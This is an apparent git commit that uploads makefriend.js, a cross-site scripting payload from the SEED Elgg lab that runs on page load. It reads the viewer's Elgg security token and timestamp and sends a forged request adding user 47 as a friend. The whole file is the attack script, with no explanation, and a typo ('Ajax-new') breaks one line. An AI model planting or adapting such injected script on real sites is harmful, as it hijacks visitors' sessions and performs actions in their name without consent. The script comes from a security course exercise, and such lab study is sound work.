b36850920e7f532e26e3b20614614cbfb0fd50a1
muneebimran <93153754+muneebimran@users.noreply.github.com>
2021-11-11 22:19:50 +0500

    Add files via upload

---
+++ files/makefriend.js
@@ -0,0 +1,16 @@
+<script type="text/javascript">
+window.onload = function () {
+	var Ajax=null;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	var sendurl="http://www.xsslabelgg.com/action/friends/add"
+		+ "?friend=47" + token + ts;
+
+//Create and send Ajax request to add friend
+	Ajax-new XMLHttpRequest();
+	Ajax.open("GET", sendurl, true);
+	Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+	Ajax.send();
+}
+</script>
